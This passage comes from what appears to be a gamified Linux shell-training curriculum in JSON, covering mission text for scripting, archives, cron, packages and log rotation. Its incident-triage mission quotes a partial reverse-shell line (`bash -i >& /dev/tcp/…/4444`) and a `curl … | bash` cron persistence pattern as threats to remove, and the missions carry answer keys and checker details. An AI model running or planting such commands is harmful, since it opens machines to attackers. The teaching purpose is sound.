              "step": "• No argument → print `usage: ...` to **stderr** and `exit 1`."
            },
            {
              "step": "• Argument is a directory → print `is a directory` and `exit 0`."
            },
            {
              "step": "• Argument is a regular file → print `is a file` and `exit 0`."
            },
            {
              "step": "• Argument names something that doesn't exist → print `does not exist` and `exit 2`."
            },
            {
              "step": "Skeleton to complete:",
              "code": "#!/usr/bin/env bash\nif [ \"$#\" -eq 0 ]; then\n    echo \"usage: $0 <path>\" >&2\n    exit 1\nfi\nif [ -d \"$1\" ]; then\n    echo \"is a directory\"; exit 0\nelif [ -f \"$1\" ]; then\n    echo \"is a file\"; exit 0\nelse\n    echo \"does not exist\"; exit 2\nfi"
            },
            {
              "step": "Test all four paths and check `$?` each time: no-arg, a dir (like `.`), a file (like the script itself), and a made-up name."
            }
          ],
          "artifacts": [
            [
              "filecheck.sh",
              "executable; four behaviors with exit codes 1/0/0/2 and stderr usage"
            ]
          ],
          "hints": [
            "Order matters: test -d before -f, and both before the 'does not exist' else.",
            "`>&2` redirects that echo to stderr. The checker verifies the usage text is NOT on stdout.",
            "Verify exit codes: `./filecheck.sh; echo $?` should print 1 (no arg)."
          ]
        },
        {
          "id": "7.4",
          "slug": "04-loops-functions",
          "title": "Loops & Functions",
          "tagline": "for, while, and reusable functions.",
          "xp": 100,
          "minutes": 30,
          "boss": false,
          "path": "missions/07-brown-belt/04-loops-functions/README.md",
          "intro": "Repetition is the whole reason scripts exist. Loops let one instruction process a thousand items; functions let you name a chunk of logic and reuse it. Together they turn scripts from linear notes into real programs.",
          "learn": [
            {
              "h": "The for loop",
              "code": "for f in *.txt; do\n    echo \"found: $f\"\ndone\n\nfor i in 1 2 3; do echo \"n=$i\"; done\n\nfor i in $(seq 1 5); do echo \"$i\"; done   # 1..5",
              "label": "for VAR in LIST; do … done"
            },
            {
              "h": "Looping over files SAFELY",
              "p": "Glob directly (`for f in *.txt`) rather than `for f in $(ls)` — the latter breaks on spaces in names. Always quote `\"$f\"` inside the loop. If a glob might match nothing, guard with `[ -e \"$f\" ]` at the top of the body."
            },
            {
              "h": "The while loop",
              "code": "count=1\nwhile [ \"$count\" -le 5 ]; do\n    echo \"tick $count\"\n    count=$(( count + 1 ))\ndone\n\nwhile read -r line; do        # read a file line by line\n    echo \"line: $line\"\ndone < input.txt",
              "label": "while CONDITION; do … done"
            },
            {
              "h": "Functions",
              "code": "greet() {\n    local name=\"$1\"        # 'local' keeps it inside the function\n    echo \"Hello, $name\"\n}\ngreet \"Tux\"                # call it like a command\n\ncount_files() {\n    find \"$1\" -type f | wc -l\n}\nn=$(count_files .)          # capture a function's output",
              "label": "name() { … } — call by name, args are $1 $2 …"
            },
            {
              "p": "Functions take arguments exactly like scripts do (`$1`, `$2`, `$#`) and 'return' data by printing it (captured with `$(...)`). Use `local` for a function's own variables so they don't leak into the rest of the script — a discipline that prevents baffling bugs."
            },
            {
              "tip": "`return N` sets a function's *exit code* (0–255), not its output. Output is what you `echo`. Confusing the two is a rite of passage — now you can skip it."
            }
          ],
          "task": [
            {
              "step": "Write `inspector.sh <dir>` that reports on a directory using BOTH a function and a loop. It must print exactly three lines:",
              "code": "dirs=<number of subdirectories>\nfiles=<number of regular files>\ntotal=<dirs + files>"
            },
            {
              "step": "It must contain at least one function definition (`name() { ... }`) and at least one loop (`for` or `while`). One working shape:",
              "code": "#!/usr/bin/env bash\ntarget=\"${1:-.}\"\ncount_type() {\n    local kind=\"$1\" dir=\"$2\" n=0\n    for entry in \"$dir\"/*; do\n        [ -e \"$entry\" ] || continue\n        if [ \"$kind\" = d ] && [ -d \"$entry\" ]; then n=$(( n + 1 )); fi\n        if [ \"$kind\" = f ] && [ -f \"$entry\" ]; then n=$(( n + 1 )); fi\n    done\n    echo \"$n\"\n}\nd=$(count_type d \"$target\")\nf=$(count_type f \"$target\")\necho \"dirs=$d\"\necho \"files=$f\"\necho \"total=$(( d + f ))\""
            },
            {
              "step": "The checker runs your script against a fixture directory with 2 subdirectories and 3 files (expecting dirs=2, files=3, total=5). Test yours against such a folder — make one with `mkdir -p t/{a,b}; touch t/{x,y,z}.txt; ./inspector.sh t`."
            }
          ],
          "artifacts": [
            [
              "inspector.sh",
              "executable; prints dirs=/files=/total=; contains a function AND a loop; correct on the fixture"
            ]
          ],
          "hints": [
            "The `[ -e \"$entry\" ] || continue` guard handles the case where a glob matches nothing.",
            "total must equal dirs + files. The checker builds a 2-dir/3-file fixture and expects 2/3/5.",
            "The checker greps your script for a function definition and a loop keyword — keep both."
          ]
        },
        {
          "id": "7.5",
          "slug": "05-boss-backup-forge",
          "title": "BOSS — The Backup Forge",
          "tagline": "Build a real, argument-driven backup tool with retention.",
          "xp": 250,
          "minutes": 50,
          "boss": true,
          "path": "missions/07-brown-belt/05-boss-backup-forge/README.md",
          "intro": "Time to forge a tool you'd actually keep. A backup script: it takes arguments, validates them like an adult, compresses a directory with a timestamped name, and prunes old backups so the disk never fills. This is the graduation of the Script Smith.",
          "learn": [
            {
              "h": "Boss briefing — the spec",
              "list": [
                "`./backup.sh --help` → print usage, exit 0.",
                "`./backup.sh` with NO arguments → usage on stderr, exit 1.",
                "`./backup.sh <dir>` where <dir> doesn't exist → error on stderr, exit 2.",
                "`./backup.sh <dir>` (valid) → create `backups/<basename>-<timestamp>.tar.gz`, print a `created …` line, exit 0.",
                "Retention: keep only the **3 newest** archives in `backups/`, delete older ones."
              ]
            },
            {
              "h": "The compression command",
              "code": "tar -czf backups/name-20260101-120000.tar.gz -C parent basename\n#      │││                                        └ -C: cd there first, then archive 'basename'\n#      ││└ f: output file\n#      │└ z: gzip compress\n#      └ c: create",
              "label": "tar czf — create gzipped archive"
            },
            {
              "h": "A safe timestamp",
              "code": "ts=$(date +%Y%m%d-%H%M%S)      # 20260101-120000 — sortable, no spaces",
              "label": "Sortable timestamps make retention trivial"
            },
            {
              "h": "Retention with ls",
              "code": "ls -1t backups/*.tar.gz 2>/dev/null | tail -n +4 | while read -r old; do\n    rm -f \"$old\"\ndone\n# ls -1t = newest first; tail -n +4 = everything from the 4th onward (the old ones)",
              "label": "Keep 3: delete from the 4th-newest down"
            },
            {
              "h": "Recommended header",
              "code": "#!/usr/bin/env bash\nset -euo pipefail\n# -e exit on error, -u error on unset var, -o pipefail catch errors mid-pipe",
              "label": "The professional safety header"
            },
            {
              "tip": "Build incrementally: get `--help` working, then no-args, then the missing-dir case, then the happy path, and retention last. Test each branch before adding the next — that's how real tools get written."
            }
          ],
          "task": [
            {
              "step": "Write `backup.sh` meeting every point in the spec above. Handle `--help`, no-args (stderr+exit 1), missing dir (stderr+exit 2), and the happy path (create timestamped tar.gz in `backups/`, print `created <path>`, exit 0)."
            },
            {
              "step": "Implement retention: after creating a backup, keep only the 3 newest `.tar.gz` files in `backups/`."
            },
            {
              "step": "Test it yourself against a sample directory:",
              "code": "chmod +x backup.sh\nmkdir -p sample-data && echo hi > sample-data/a.txt\n./backup.sh --help; echo \"rc=$?\"\n./backup.sh; echo \"rc=$?\"            # expect rc=1\n./backup.sh /no/such/dir; echo \"rc=$?\"  # expect rc=2\n./backup.sh sample-data; echo \"rc=$?\"   # expect rc=0 + a created line\nls backups/"
            },
            {
              "step": "The checker will run your script several times to confirm retention keeps exactly 3 archives. Make sure the archive is a valid tar.gz containing your source files (`tar -tzf backups/....tar.gz`)."
            }
          ],
          "artifacts": [
            [
              "backup.sh",
              "executable; all four behaviors with correct exit codes"
            ],
            [
              "backups/*.tar.gz",
              "valid gzipped tar containing the backed-up files"
            ],
            [
              "retention",
              "never more than 3 archives kept"
            ]
          ],
          "hints": [
            "For --help, check `[ \"$1\" = \"--help\" ]` BEFORE the no-args check (well, no-args means $# -eq 0).",
            "Validate: `[ $# -eq 0 ]` → exit 1; `[ ! -d \"$1\" ]` → exit 2.",
            "Verify an archive: `tar -tzf backups/<file>.tar.gz` should list your source files.",
            "Retention counts only .tar.gz in backups/. Run backup.sh 4+ times and confirm `ls backups | wc -l` stays 3."
          ]
        }
      ]
    },
    {
      "n": 8,
      "slug": "08-red-belt",
      "name": "Red Belt",
      "color": "#ef4444",
      "rank": "System Craftsman",
      "motto": "The system is yours to shape: archives, environment, time, and software.",
      "notebook": "Draw the system map as a neighborhood — each directory a building with a job. Where do logs live? Where do configs live? Note the `apt update` vs `apt upgrade` gotcha for your past self.",
      "side": false,
      "missions": [
        {
          "id": "8.1",
          "slug": "01-archive-alchemy",
          "title": "Archive Alchemy",
          "tagline": "tar and gzip — bundle, compress, and unpack anything.",
          "xp": 100,
          "minutes": 25,
          "boss": false,
          "path": "missions/08-red-belt/01-archive-alchemy/README.md",
          "intro": "Every release, backup, and log rotation on Earth passes through `tar`. Its flags confuse beginners for years — today you break that spell for good with one mnemonic and a lot of practice.",
          "learn": [
            {
              "h": "The mnemonic that ends the confusion",
              "code": "tar -czf archive.tar.gz stuff/     # Create Zipped File\ntar -tzf archive.tar.gz            # lisT Zipped File (peek inside, extract nothing)\ntar -xzf archive.tar.gz            # eXtract Zipped File",
              "label": "Create / lisT / eXtract — each with z (gzip) and f (file)"
            },
            {
              "p": "Read the letters: **c**reate, **t** = lis**t**, e**x**tract. Add **z** for gzip compression and **f** to name the file (the `f` must come last, right before the filename). Nearly every tar you'll ever type is one of `czf`, `tzf`, `xzf`."
            },
            {
              "h": "Controlling paths with -C",
              "code": "tar -czf logs.tar.gz -C /var/log .    # archive the CONTENTS of /var/log\ntar -xzf logs.tar.gz -C /tmp/restore   # extract INTO a chosen directory",
              "label": "-C = cd there first"
            },
            {
              "p": "`-C` avoids ugly absolute paths inside archives and lets you extract wherever you want. Good archives contain *relative* paths (`shipment/manifest.txt`), not `/home/you/...` — so they unpack cleanly on any machine."
            },
            {
              "h": "Verbose and inspection",
              "code": "tar -czvf a.tar.gz dir/    # v = verbose: print each file as it's added\ntar -tzf a.tar.gz | wc -l  # how many entries in this archive?\nfile mystery.gz            # what IS this thing? (file inspects any file's type)",
              "label": "v to watch it work; tzf to look before you leap"
            },
            {
              "h": "gzip on its own",
              "code": "gzip big.log        # → big.log.gz  (replaces the original)\ngunzip big.log.gz   # → big.log     (back again)\nzcat big.log.gz     # read a .gz WITHOUT unpacking it",
              "label": "gzip compresses single files; tar bundles many"
            },
            {
              "tip": "Always `tar -tzf` an unknown archive before extracting. A malicious or sloppy archive can scatter files across your directory ('tar bomb'); listing first shows you exactly what — and where — it will write."
            }
          ],
          "task": [
            {
              "step": "A `relics.tar.gz` archive is provided. FIRST list its contents (don't extract yet): `tar -tzf relics.tar.gz`."
            },
            {
              "step": "Extract it, then combine the two scrolls' text into `scrolls.txt` — scroll-1's line then scroll-2's line:",
              "code": "tar -xzf relics.tar.gz\ncat relics/scroll-1.txt relics/scroll-2.txt > scrolls.txt"
            },
            {
              "step": "Now go the other way: create a gzipped archive `shipment.tar.gz` of the provided `shipment/` directory. Make sure the paths inside are relative (contain `shipment/manifest.txt`).",
              "code": "tar -czf shipment.tar.gz shipment"
            },
            {
              "step": "Record the flags in `answers.md`:",
              "code": "list_flag=THE_SINGLE_LETTER_THAT_LISTS_AN_ARCHIVE\nextract_flag=THE_SINGLE_LETTER_THAT_EXTRACTS"
            }
          ],
          "artifacts": [
            [
              "scrolls.txt",
              "two lines: 'wax on' then 'wax off'"
            ],
            [
              "shipment.tar.gz",
              "gzipped tar; `tar -tzf` shows shipment/manifest.txt"
            ],
            [
              "answers.md",
              "list_flag=t, extract_flag=x"
            ]
          ],
          "hints": [
            "list = t, extract = x, create = c. Each pairs with z (gzip) and f (file).",
            "Verify your new archive: `tar -tzf shipment.tar.gz` should list shipment/manifest.txt and friends."
          ]
        },
        {
          "id": "8.2",
          "slug": "02-environment-control",
          "title": "Environment Control",
          "tagline": "PATH, export, and the variables every process inherits.",
          "xp": 100,
          "minutes": 30,
          "boss": false,
          "path": "missions/08-red-belt/02-environment-control/README.md",
          "intro": "Why does typing `ls` find the program, but `./script.sh` needs the dots? Why do some variables survive into programs you launch and others vanish? The answer is the *environment* — and controlling it is what separates users from craftsmen.",
          "learn": [
            {
              "h": "Shell variables vs environment variables",
              "code": "name=\"Tux\"          # a SHELL variable — this shell only\nexport name         # now it's an ENVIRONMENT variable — inherited by children\nexport city=\"Oslo\"  # set and export in one line\nenv                 # list all environment variables\nprintenv PATH       # print one",
              "label": "export promotes a variable so child processes inherit it"
            },
            {
              "p": "When you run a program, it gets a *copy* of the exported environment. It can change its own copy freely, but **cannot** change the parent shell's variables — children never affect parents. That's why a script can't `cd` your interactive shell for you (unless you `source` it). Inheritance flows one way: down."
            },
            {
              "h": "PATH — the search list",
              "code": "echo \"$PATH\"        # colon-separated list of directories\n# /usr/local/bin:/usr/bin:/bin:...\nwhich ls            # WHERE bash found 'ls' along PATH\ntype ls             # is it a program, builtin, alias, or function?",
              "label": "PATH is why you type `ls` not `/bin/ls`"
            },
            {
              "p": "When you type a bare command, bash searches each PATH directory in order and runs the first match. `.` (the current directory) is deliberately NOT on PATH — otherwise a malicious `ls` dropped in a folder you `cd` into would hijack the real one. That safety choice is exactly why you must write `./script.sh` to run something in the current dir."
            },
            {
              "h": "Adding to PATH",
              "code": "export PATH=\"$HOME/bin:$PATH\"     # prepend your own bin dir (wins over system)\nexport PATH=\"$PATH:$HOME/bin\"     # append (system wins on conflicts)",
              "label": "Prepend for priority, append for fallback — put it in ~/.bashrc to persist"
            },
            {
              "h": "Where settings live",
              "list": [
                "`~/.bashrc` — runs for each interactive non-login shell (most terminals). Aliases, PATH, prompt.",
                "`~/.profile` / `~/.bash_profile` — login shells.",
                "`export` in a shell — this session only; put it in `.bashrc` to make it permanent."
              ]
            },
            {
              "tip": "`source file` (or `. file`) runs a script *in your current shell* instead of a child — so its `export`s and `cd`s affect you. That's how `source ~/.bashrc` reloads your config without opening a new terminal."
            }
          ],
          "task": [
            {
              "step": "Capture your PATH, one directory per line, into `path-report.txt`:",
              "code": "echo \"$PATH\" | tr ':' '\\n' > path-report.txt"
            },
            {
              "step": "Write a script `env_probe.sh` that prints where HOME points and how many entries PATH has:",
              "code": "#!/usr/bin/env bash\necho \"home=$HOME\"\necho \"path_entries=$(echo \"$PATH\" | tr ':' '\\n' | grep -c .)\""
            },
            {
              "step": "Prove children get a COPY of the environment: run your probe with a modified HOME just for that one command, and confirm your real shell's HOME is unchanged:",
              "code": "chmod +x env_probe.sh\nHOME=/tmp/fakehome ./env_probe.sh    # prints home=/tmp/fakehome\necho \"$HOME\"                          # your REAL home — unchanged"
            },
            {
              "step": "Record the concepts in `answers.md`:",
              "code": "child_can_set_parent_env=CAN_A_CHILD_PROCESS_CHANGE_ITS_PARENT_SHELL_VARS?_yes_or_no\nbash_interactive_file=WHICH_DOTFILE_CONFIGURES_INTERACTIVE_SHELLS   # the ~/.___ file"
            }
          ],
          "artifacts": [
            [
              "path-report.txt",
              "3+ lines, PATH split one dir per line"
            ],
            [
              "env_probe.sh",
              "executable; HOME=/tmp/fakehome ./env_probe.sh → home=/tmp/fakehome, path_entries=<digits>"
            ],
            [
              "answers.md",
              "child_can_set_parent_env=no, bash_interactive_file=.bashrc"
            ]
          ],
          "hints": [
            "`VAR=value command` sets VAR just for that one command's environment — the perfect demo.",
            "Children get a COPY, so they can't change the parent → the answer is `no`.",
            "The interactive-shell dotfile is `.bashrc`."
          ]
        },
        {
          "id": "8.3",
          "slug": "03-time-lords",
          "title": "Time Lords",
          "tagline": "cron — schedule work to run itself, forever.",
          "xp": 100,
          "minutes": 30,
          "boss": false,
          "path": "missions/08-red-belt/03-time-lords/README.md",
          "intro": "The final promotion of automation: work that runs with nobody watching. `cron` is the scheduler behind backups, report emails, and cleanup jobs on nearly every server alive. Its five-field syntax looks cryptic for about ten minutes, then never again.",
          "learn": [
            {
              "h": "The five fields",
              "code": "# ┌─ minute (0-59)\n# │ ┌─ hour (0-23)\n# │ │ ┌─ day of month (1-31)\n# │ │ │ ┌─ month (1-12)\n# │ │ │ │ ┌─ day of week (0-7, 0 and 7 = Sunday)\n# │ │ │ │ │\n  0 8 * * *   /opt/dojo/checkup.sh    # every day at 08:00\n",
              "label": "min hour dom month dow  command"
            },
            {
              "h": "The special characters",
              "list": [
                "`*` — every value ('every hour', 'every day')",
                "`*/15` — every 15 units (in the minute field: every 15 minutes)",
                "`1-5` — a range (in day-of-week: Mon–Fri)",
                "`1,15` — a list (1st and 15th)",
                "day-of-week accepts `mon tue wed …` names too"
              ]
            },
            {
              "h": "Reading real schedules",
              "code": "0 8 * * *        # daily at 08:00\n*/15 * * * *     # every 15 minutes, all day\n30 18 * * 1      # 18:30 every Monday (1 = Mon)\n0 0 1 * *        # midnight on the 1st of every month\n0 2 * * 0        # 02:00 every Sunday",
              "label": "Practice reading these until they're obvious"
            },
            {
              "h": "Managing your crontab",
              "code": "crontab -l       # list your scheduled jobs\ncrontab -e       # edit them (opens your editor)\ncrontab -r       # remove ALL of them (careful!)",
              "label": "Per-user schedules, edited safely"
            },
            {
              "h": "The #1 cron gotcha",
              "p": "Cron runs jobs with a **minimal environment** — a bare PATH, no `~/.bashrc`, often no `HOME` you expect. Scripts that work in your terminal fail under cron because a command isn't on cron's PATH. The fix: use **absolute paths** for everything (`/usr/bin/find`, `/opt/app/run.sh`), or set PATH explicitly at the top of the script. Also redirect output (`>> /var/log/job.log 2>&1`) — cron emails it into the void otherwise."
            },
            {
              "tip": "Test the *command* by hand first, with the exact absolute paths cron will use. 'Works in my shell' is not 'works in cron' — the environment is the difference."
            }
          ],
          "task": [
            {
              "step": "Write a crontab file `schedule.cron` with exactly four job lines (comments allowed but they don't count), scheduling these absolute-path scripts:"
            },
            {
              "step": "• `/opt/dojo/checkup.sh` — every day at **08:00**"
            },
            {
              "step": "• `/opt/dojo/pulse.sh` — **every 15 minutes**"
            },
            {
              "step": "• `/opt/dojo/weekly.sh` — **18:30 every Monday**"
            },
            {
              "step": "• `/opt/dojo/rollup.sh` — **midnight on the 1st of each month**"
            },
            {
              "step": "Reference shape (fill the fields in yourself before peeking at the hints):",
              "code": "0 8 * * *    /opt/dojo/checkup.sh\n*/15 * * * * /opt/dojo/pulse.sh\n30 18 * * 1  /opt/dojo/weekly.sh\n0 0 1 * *    /opt/dojo/rollup.sh"
            },
            {
              "step": "Record two facts in `answers.md`:",
              "code": "field_order=THE_FIRST_TWO_FIELD_NAMES_IN_ORDER    # e.g. minute hour\ncron_env_gotcha=THE_ONE_WORD_MOST_LIKELY_TO_BE_WRONG_UNDER_CRON   # hint: it's an env variable"
            }
          ],
          "artifacts": [
            [
              "schedule.cron",
              "four correct cron lines for the four scripts"
            ],
            [
              "answers.md",
              "field_order and cron_env_gotcha"
            ]
          ],
          "hints": [
            "'every 15 minutes' is `*/15` in the minute field, `*` everywhere else.",
            "Monday is day-of-week 1; 18:30 is minute 30, hour 18.",
            "field_order: the fields start minute then hour. cron_env_gotcha: the classic culprit is PATH."
          ]
        },
        {
          "id": "8.4",
          "slug": "04-package-wisdom",
          "title": "Package Wisdom",
          "tagline": "apt, dnf, pacman — install software the right way, everywhere.",
          "xp": 100,
          "minutes": 25,
          "boss": false,
          "path": "missions/08-red-belt/04-package-wisdom/README.md",
          "intro": "Software doesn't come from random `curl | bash` incantations — it comes from package managers that track versions, dependencies, and files. Different distro families speak different dialects; a Craftsman knows the Rosetta Stone.",
          "learn": [
            {
              "h": "The three big families",
              "list": [
                "**Debian/Ubuntu** → `apt` (packages are `.deb`)",
                "**RHEL/Fedora/Rocky** → `dnf` (older: `yum`; packages are `.rpm`)",
                "**Arch** → `pacman`"
              ]
            },
            {
              "h": "The same tasks, three dialects",
              "code": "# update the package index (do this first!)\napt update            dnf check-update       pacman -Sy\n# install a package\napt install nginx     dnf install nginx      pacman -S nginx\n# remove a package\napt remove nginx      dnf remove nginx       pacman -R nginx\n# search\napt search nginx      dnf search nginx       pacman -Ss nginx\n# what package owns this file?\ndpkg -S /usr/bin/nginx   rpm -qf /usr/bin/nginx   pacman -Qo /usr/bin/nginx",
              "label": "Learn the concepts; the commands are just translations"
            },
            {
              "h": "update vs upgrade (the trap)",
              "p": "On Debian/Ubuntu, `apt update` only refreshes the *list* of available versions — it installs nothing. `apt upgrade` then actually installs the newer versions. Beginners run `update` and wonder why nothing upgraded. Always: `apt update && apt upgrade`."
            },
            {
              "h": "remove vs purge",
              "p": "`apt remove pkg` deletes the program but *keeps* its config files (so a reinstall remembers your settings). `apt purge pkg` removes the program **and** its system-wide config. When you want it truly gone, purge."
            },
            {
              "h": "Why not just download binaries?",
              "p": "Package managers verify signatures, resolve dependencies, let you cleanly uninstall, and receive security updates. A binary you `curl`ed into `/usr/local/bin` does none of that and becomes an untracked liability. Prefer the package manager; reach outside it only when you must, and document it."
            },
            {
              "tip": "`apt-get` vs `apt`: `apt` is the friendlier modern front-end for interactive use; `apt-get` is the stable interface for scripts. Same underlying system."
            }
          ],
          "task": [
            {
              "step": "Survey what package tooling exists on YOUR machine (any that are missing simply won't print — that's fine) into `tool-census.txt`:",
              "code": "{ echo \"=== which package managers are present ===\"\n  for pm in apt apt-get dnf yum pacman zypper apk brew; do\n      if command -v \"$pm\" >/dev/null 2>&1; then echo \"present: $pm\"; else echo \"absent:  $pm\"; fi\n  done\n} > tool-census.txt"
            },
            {
              "step": "Fill the cross-distro Rosetta Stone in `answers.md`:",
              "code": "debian_install=THE_COMMAND_WORD_TO_INSTALL_ON_DEBIAN    # apt (or apt-get)\nredhat_family=THE_PACKAGE_MANAGER_ON_FEDORA/RHEL         # dnf (yum also accepted)\narch_pm=THE_PACKAGE_MANAGER_ON_ARCH                      # pacman\nq_update=WHICH_apt_SUBCOMMAND_REFRESHES_THE_INDEX?      # update or upgrade\nremove_config_too=THE_apt_SUBCOMMAND_THAT_ALSO_DELETES_CONFIG   # remove or purge"
            }
          ],
          "artifacts": [
            [
              "tool-census.txt",
              "3+ lines reporting present/absent package managers"
            ],
            [
              "answers.md",
              "five keys of cross-distro knowledge"
            ]
          ],
          "hints": [
            "`command -v pm` is the portable 'is this installed?' test.",
            "q_update is `update` (refreshes the index; upgrade installs). remove_config_too is `purge`.",
            "redhat_family accepts dnf or yum; arch_pm is pacman."
          ]
        },
        {
          "id": "8.5",
          "slug": "05-boss-log-rotation",
          "title": "BOSS — The Log Rotation Engine",
          "tagline": "Build the tool that keeps servers from filling their disks.",
          "xp": 250,
          "minutes": 55,
          "boss": true,
          "path": "missions/08-red-belt/05-boss-log-rotation/README.md",
          "intro": "Unrotated logs are the #1 way servers silently die: `/var/log` fills, writes fail, everything topples. `logrotate` solves this in production — but tonight you build a miniature of it yourself, and understand forever what it does. This is the System Craftsman's masterwork.",
          "learn": [
            {
              "h": "Boss briefing — what rotation means",
              "p": "Rotation caps a growing log by shifting old copies down a numbered ladder and starting fresh. `app.log` becomes `app.log.1`; the old `app.log.1` becomes `app.log.2` (usually gzipped as `app.log.2.gz`), and so on. Beyond a retention limit, the oldest is deleted. The live log is truncated back to empty so the app keeps writing to the same path."
            },
            {
              "h": "The spec for logkeeper.sh",
              "code": "./logkeeper.sh <logfile> <keep>\n#   <logfile> : path to the active log\n#   <keep>    : how many rotated copies to retain",
              "label": "Two required arguments"
            },
            {
              "list": [
                "Missing arguments → usage on **stderr**, `exit 2`.",
                "Shift existing rotations DOWN: `.1`→`.2`, `.2`→`.3`, … (work from highest number downward so you don't clobber).",
                "Move the current log to `.1`, then **gzip** the rotations except the freshest (`.1` stays plain so it's easy to read; `.2`, `.3`, … are `.gz`). *(Simpler accepted variant: gzip every rotation — the checker accepts either as long as `.1` exists after one rotation.)*",
                "Recreate the active log as a new **empty** file.",
                "Delete rotations beyond `<keep>`.",
                "Print a `rotated <logfile>` line on success, `exit 0`."
              ]
            },
            {
              "h": "Shifting safely (highest first!)",
              "code": "# to avoid overwriting, move the HIGHEST numbers first\ni=\"$keep\"\nwhile [ \"$i\" -ge 1 ]; do\n    if [ -f \"$log.$i\" ]; then mv \"$log.$i\" \"$log.$((i+1))\"; fi\n    if [ -f \"$log.$i.gz\" ]; then mv \"$log.$i.gz\" \"$log.$((i+1)).gz\"; fi\n    i=$((i-1))\ndone\nmv \"$log\" \"$log.1\"\n: > \"$log\"          # truncate/recreate empty (the : builtin does nothing, > empties)",
              "label": "Descend the ladder, then rotate in the live log"
            },
            {
              "h": "Trimming to the retention limit",
              "code": "# delete anything numbered above <keep>\nn=$((keep+1))\nwhile [ -f \"$log.$n\" ] || [ -f \"$log.$n.gz\" ]; do\n    rm -f \"$log.$n\" \"$log.$n.gz\"\n    n=$((n+1))\ndone",
              "label": "Prune the tail"
            },
            {
              "tip": "Test by running it repeatedly against a log you keep re-filling: after each run, `ls -1 <log>*` should show the ladder growing then capping at `<keep>` rotations. Watching the ladder behave is how you know it's right."
            }
          ],
          "task": [
            {
              "step": "Write `logkeeper.sh` implementing the full spec. Start from the header `#!/usr/bin/env bash` and `set -euo pipefail`."
            },
            {
              "step": "Handle the argument errors first (missing args → stderr + exit 2)."
            },
            {
              "step": "Implement the shift-down, rotate-current, truncate, gzip, and prune logic."
            },
            {
              "step": "Test the whole lifecycle yourself:",
              "code": "chmod +x logkeeper.sh\nprintf 'line1\\nline2\\n' > app.log\n./logkeeper.sh app.log 3; echo \"rc=$?\"    # creates app.log.1, empties app.log\nls -1 app.log*\nprintf 'more\\n' > app.log\n./logkeeper.sh app.log 3                    # now app.log.1 fresh, older shifted\nls -1 app.log*\n./logkeeper.sh; echo \"rc=$?\"               # missing args → rc=2"
            },
            {
              "step": "Run it enough times to confirm it never keeps more than `<keep>` rotations."
            }
          ],
          "artifacts": [
            [
              "logkeeper.sh",
              "executable; usage+exit 2 on missing args; correct rotation lifecycle; caps at <keep>"
            ]
          ],
          "hints": [
            "Shift from the HIGHEST number down, or you'll overwrite .2 with .1 before saving it.",
            "`: > \"$log\"` recreates the active log as empty (the app would keep writing to it).",
            "After one rotation there must be an `app.log.1` and `app.log` must exist and be empty.",
            "The checker fills+rotates several times and asserts the count of rotated files never exceeds <keep>."
          ]
        }
      ]
    },
    {
      "n": 9,
      "slug": "09-black-belt",
      "name": "Black Belt",
      "color": "#111827",
      "rank": "Tux Sensei",
      "motto": "You no longer run commands. You compose systems.",
      "notebook": "Write today's date and one line: \"what I didn't know X weeks ago.\" Keep it. On the days impostor syndrome visits, reread it. 🥋",
      "side": false,
      "missions": [
        {
          "id": "9.1",
          "slug": "01-incident-triage",
          "title": "Incident Triage",
          "tagline": "A server is down and possibly breached. Stabilize it under pressure.",
          "xp": 150,
          "minutes": 45,
          "boss": false,
          "path": "missions/09-black-belt/01-incident-triage/README.md",
          "intro": "3 AM. A production box crashed and something looks planted. You have a captured `server-room/` to work in — logs, junk, secrets with wrong permissions, and a backdoor hiding in the dark. Black belts don't panic; they triage: find the cause, remove the threat, lock the doors, and write it up.",
          "learn": [
            {
              "h": "The triage mindset",
              "list": [
                "**Diagnose before you touch.** Read the logs; find the FATAL line that explains the crash.",
                "**Contain the threat.** A reverse-shell script and a malicious cron are active dangers — remove them.",
                "**Fix exposure.** Secrets and private keys must be `600`; a world-readable credential is an open door.",
                "**Clean the debris.** Junk and core dumps that filled the disk should go — carefully.",
                "**Document everything.** The report is how the team learns and how you cover the incident."
              ]
            },
            {
              "h": "Everything you've learned, at once",
              "code": "grep -c ERROR server-room/logs/app.log         # how bad was it?\ngrep FATAL server-room/logs/app.log             # WHY did it die?\nls -la server-room/                             # -a: reveal the hidden backdoor\nchmod 600 server-room/config/secrets.env        # lock the secret\nfind server-room -name '*.tmp' -o -name 'core.*' # the debris",
              "label": "Belts 1–8, applied under fire"
            },
            {
              "h": "Spotting the backdoor",
              "p": "A file whose name starts with a dot (`ls -a` to see it) containing a line like `bash -i >& /dev/tcp/…/4444` is a **reverse shell** — it dials out to give an attacker a prompt on your box. A cron entry piping `curl … | bash` re-installs malware on a schedule. Both must be removed; the cron is the persistence, the script is the payload."
            },
            {
              "tip": "Order of operations in a real breach: capture evidence, remove persistence (cron), remove payload (the script), rotate exposed secrets, THEN clean disk. This mission compresses that into a checklist — internalize the order."
            }
          ],
          "task": [
            {
              "step": "Diagnose: read `server-room/logs/app.log`. Count the ERROR lines and find the one FATAL line explaining the crash."
            },
            {
              "step": "Contain: delete the hidden reverse-shell script (find it with `ls -la server-room/`) and remove the malicious `cron-dump.txt` backdoor file."
            },
            {
              "step": "Lock down: set `server-room/config/secrets.env` and `server-room/config/deploy_key` to mode `600`."
            },
            {
              "step": "Clean: delete the debris — every `*.tmp` file and the `core.*` dump under `server-room/`."
            },
            {
              "step": "Report: write `triage.md` with exactly these keys:",
              "code": "fatal_reason=SHORT_PHRASE_FROM_THE_FATAL_LINE      # what filled up / broke\nerror_count=NUMBER_OF_ERROR_LINES\nbackdoor_file=NAME_OF_THE_HIDDEN_REVERSE_SHELL_SCRIPT\ncron_backdoor=THE_SUSPICIOUS_COMMAND_IN_THE_CRON_DUMP   # a word like curl\nfirst_action=ONE_SENTENCE:_WHAT_YOU_DID_FIRST_AND_WHY"
            }
          ],
          "artifacts": [
            [
              "secrets.env + deploy_key",
              "both mode 600"
            ],
            [
              "backdoor removed",
              "the hidden .sh reverse shell and cron-dump.txt are gone"
            ],
            [
              "debris removed",
              "no *.tmp and no core.* remain under server-room/"
            ],
            [
              "triage.md",
              "all five keys; fatal_reason and first_action are real sentences"
            ]
          ],
          "hints": [
            "`ls -la server-room/` reveals the dot-file backdoor; its name starts with `.hidden`.",
            "error_count: `grep -c ERROR server-room/logs/app.log`.",
            "The FATAL line mentions the disk filling — 'disk full' is the fatal_reason.",
            "cron_backdoor: the cron line pipes `curl ... | bash`, so the answer word is `curl`."
          ]
        },
        {
          "id": "9.2",
          "slug": "02-sysinfo-suite",
          "title": "The Sysinfo Suite",
          "tagline": "Write a production-grade diagnostics tool, JSON and all.",
